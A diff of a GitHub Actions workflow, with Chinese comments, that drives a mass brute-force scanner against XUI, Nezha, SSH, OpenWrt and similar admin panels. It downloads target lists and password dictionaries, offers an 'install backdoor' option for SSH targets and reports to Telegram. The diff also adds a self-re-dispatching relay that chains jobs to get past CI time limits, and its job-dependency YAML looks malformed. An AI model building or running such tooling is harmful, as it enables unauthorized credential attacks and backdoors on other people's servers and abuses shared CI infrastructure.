@@ -1,5 +1,5 @@
 # .github/workflows/scanner.yml
-name: Run Scanner Script
+name: Run Scanner Script (Relay Workflow)
 
 on:
   workflow_dispatch:
@@ -8,20 +8,9 @@ on:
         description: '爆破模式 (1-8)'
         required: true
         default: '1'
-        type: choice
-        options:
-          - '1' # XUI
-          - '2' # 哪吒
-          - '3' # HUI
-          - '4' # 咸蛋
-          - '5' # SUI
-          - '6' # SSH
-          - '7' # Sub Store
-          - '8' # OpenWrt/iStoreOS
       input_file_url:
         description: '源文件下载地址 (例如 1.txt)'
         required: true
-        default: 'https://example.com/path/to/1.txt'
       lines_per_file:
         description: '每个小文件行数'
         required: true
@@ -35,85 +24,136 @@ on:
         required: true
         default: 'false'
         type: choice
-        options:
-          - 'false'
-          - 'true'
+        options: ['false', 'true']
       username_dict_url:
-        description: '【可选】用户名字典URL (当使用自定义字典时)'
+        description: '【可选】用户名字典URL'
         required: false
-        default: ''
       password_dict_url:
-        description: '【可选】密码字典URL (当使用自定义字典时)'
+        description: '【可选】密码字典URL'
         required: false
-        default: ''
       install_backdoor:
         description: '是否安装后门 (仅模式6有效)'
         required: true
         default: 'false'
         type: choice
-        options:
-          - 'false'
-          - 'true'
+        options: ['false', 'true']
+      progress_file_name:
+        description: 'Gist中用于记录进度的文件名'
+        required: true
+        default: 'scanner_progress.json'
 
 jobs:
-  run-scanner:
+  # 定义一个包含所有扫描作业的数组，方便引用
+  setup:
     runs-on: ubuntu-latest
+    outputs:
+      jobs: ${{ steps.generate_jobs.outputs.result }}
+    steps:
+      - id: generate_jobs
+        run: echo "result=$(jq -cn --argjson n 13 '[range(1; $n + 1) | "run-scan-\(.)"]')"
+
+  # 动态生成 13 个扫描作业
+  run-scan:
+    needs: setup
+    strategy:
+      matrix:
+        job_index: ${{ fromJson(needs.setup.outputs.jobs) }}
     
+    # 确保作业按顺序执行
+    # Job 2 needs Job 1, Job 3 needs Job 2, etc.
+    needs: 
+      - setup
+      - ${{ format('run-scan-{0}', fromJson(needs.setup.outputs.jobs)[matrix.job_index-2]) }}
+
+    runs-on: ubuntu-latest
+    timeout-minutes: 300 # 每个作业5小时超时
+
     steps:
       - name: Checkout repository
         uses: actions/checkout@v3
 
+      # ... (Set up Go, Python, Install, Download steps are the same)
       - name: Set up Go
         uses: actions/setup-go@v4
-        with:
-          go-version: '1.22'
-
+        with: { go-version: '1.22' }
       - name: Set up Python
         uses: actions/setup-python@v4
-        with:
-          python-version: '3.10'
-
+        with: { python-version: '3.10' }
       - name: Install dependencies
         run: |
           python -m pip install --upgrade pip
           if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
-
       - name: Download input file
-        run: |
-          curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
-          echo "源文件下载完成。"
-
+        run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
       - name: Download custom dictionaries
         if: github.event.inputs.use_custom_dict == 'true'
         run: |
-          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then
-            echo "正在下载用户名字典..."
-            curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"
-            echo "用户名字典下载完成。"
-          else
-            echo "⚠️ 未提供用户名字典URL，将检查仓库中是否存在 username.txt。"
-          fi
-          
-          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then
-            echo "正在下载密码字典..."
-            curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"
-            echo "密码字典下载完成。"
-          else
-            echo "⚠️ 未提供密码字典URL，将检查仓库中是否存在 password.txt。"
-          fi
+          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
+          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
 
-      - name: Run Python script
+      - name: Run Python Worker Script
         env:
-          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          # Pass all secrets and inputs to the script
+          GIST_ID: ${{ secrets.GIST_ID }}
+          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
           INPUT_FILE: "1.txt"
+          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
+          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
+          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
           LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
           SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
           USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
+          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
+          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
           INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
-          
-          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
-          GIST_ID: ${{ secrets.GIST_ID }}
-          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
-          
         run: python main.py
+
+  relay_or_finish:
+    runs-on: ubuntu-latest
+    # 等待最后一个扫描作业完成
+    needs: run-scan-13
+
+    steps:
+      - name: Download input file for final check
+        run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
+
+      - name: Trigger Next Workflow (if needed)
+        run: |
+          # 1. 从 Gist 获取最新的进度
+          PROGRESS_CONTENT=$(curl -s -H "Authorization: token ${{ secrets.GIST_TOKEN }}" https://api.github.com/gists/${{ secrets.GIST_ID }} | jq -r '.files."${{ github.event.inputs.progress_file_name }}".content')
+          
+          # 2. 计算总分片数和已完成分片数
+          TOTAL_LINES=$(wc -l < 1.txt)
+          LINES_PER_PART=${{ github.event.inputs.lines_per_file }}
+          TOTAL_PARTS=$(( (TOTAL_LINES + LINES_PER_PART - 1) / LINES_PER_PART ))
+          COMPLETED_PARTS=$(echo "$PROGRESS_CONTENT" | jq '.completed_parts | length')
+
+          echo "总分片数: $TOTAL_PARTS"
+          echo "已完成分片: $COMPLETED_PARTS"
+
+          # 3. 如果未完成，则触发下一个工作流
+          if [[ "$COMPLETED_PARTS" -lt "$TOTAL_PARTS" ]]; then
+            echo "任务未完成，本工作流生命周期结束，正在触发新的工作流..."
+            
+            INPUTS=$(jq -n \
+              --arg tm "${{ github.event.inputs.template_mode }}" \
+              --arg iu "${{ github.event.inputs.input_file_url }}" \
+              --arg lpf "${{ github.event.inputs.lines_per_file }}" \
+              --arg ss "${{ github.event.inputs.semaphore_size }}" \
+              --arg ucd "${{ github.event.inputs.use_custom_dict }}" \
+              --arg udu "${{ github.event.inputs.username_dict_url }}" \
+              --arg pdu "${{ github.event.inputs.password_dict_url }}" \
+              --arg ib "${{ github.event.inputs.install_backdoor }}" \
+              --arg pfn "${{ github.event.inputs.progress_file_name }}" \
+              '{ "ref": "${{ github.ref }}", "inputs": { "template_mode": $tm, "input_file_url": $iu, "lines_per_file": $lpf, "semaphore_size": $ss, "use_custom_dict": $ucd, "username_dict_url": $udu, "password_dict_url": $pdu, "install_backdoor": $ib, "progress_file_name": $pfn } }')
+
+            curl -X POST \
+              -H "Accept: application/vnd.github.v3+json" \
+              -H "Authorization: token ${{ secrets.GIST_TOKEN }}" \
+              https://api.github.com/repos/${{ github.repository }}/actions/workflows/scanner.yml/dispatches \
+              -d "$INPUTS"
+          else
+            echo "🎉 所有任务已完成，无需触发新工作流。"
+          fi
